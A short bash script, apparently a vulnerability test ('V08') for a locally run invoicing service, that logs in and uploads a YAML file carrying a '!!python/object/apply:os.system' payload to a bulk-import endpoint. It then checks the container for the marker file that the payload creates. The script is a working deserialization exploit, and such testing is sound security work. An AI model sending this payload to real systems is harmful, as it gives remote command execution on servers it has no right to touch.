#!/usr/bin/env bash
set -euo pipefail

CORE=${CORE:-http://localhost:8000}
TOKEN=$(curl -fsS "$CORE/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"operator@acme.example","password":"Password123!"}' | jq -r '.access_token')
payload=$(mktemp --suffix=.yaml)
trap 'rm -f "$payload"' EXIT
printf '%s\n' '!!python/object/apply:os.system ["touch /tmp/helios-yaml-poc"]' >"$payload"
curl -fsS "$CORE/invoices/bulk-import" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@$payload" >/dev/null

if docker compose exec -T core-api test -f /tmp/helios-yaml-poc; then
  echo "PASS V08: YAML object construction created /tmp/helios-yaml-poc in core-api"
else
  echo "FAIL V08: YAML marker was not found"
  exit 1
fi
